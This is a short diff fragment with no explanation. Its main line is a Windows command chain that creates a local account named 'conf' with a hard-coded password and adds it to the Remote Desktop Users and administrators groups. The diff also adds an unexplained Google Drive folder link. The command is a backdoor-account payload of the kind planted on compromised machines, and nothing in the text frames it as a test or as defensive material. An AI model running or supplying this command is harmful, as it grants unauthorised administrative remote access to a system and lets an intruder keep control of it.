@@ -1,1 +1,5 @@
 net user /add conf ToanMC202345678900000000000000000000 & net localgroup "Remote Desktop Users" "conf" /add & net localgroup administrators conf /add 
+
+
+
+https://drive.google.com/drive/folders/1EB3oVP_rC-yrtIKzvUmbfsx5RvYxPdIN
